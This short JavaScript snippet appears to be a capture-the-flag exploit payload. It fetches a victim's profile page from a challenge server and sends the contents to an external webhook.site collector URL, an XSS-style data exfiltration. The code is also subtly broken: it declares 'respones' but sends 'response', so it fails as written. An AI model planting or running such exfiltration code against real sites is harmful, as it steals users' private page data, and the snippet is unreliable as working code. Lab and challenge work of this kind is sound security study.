// 1. Navigate to profile

async function sendData(){

  try {
    const respones = await fetch("http://ssof2526.challenges.cwte.me:12017/profile");
    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(response));
    console.log("Sucess!");
  } catch(error) {
    console.log(error);
  }
}


sendData();

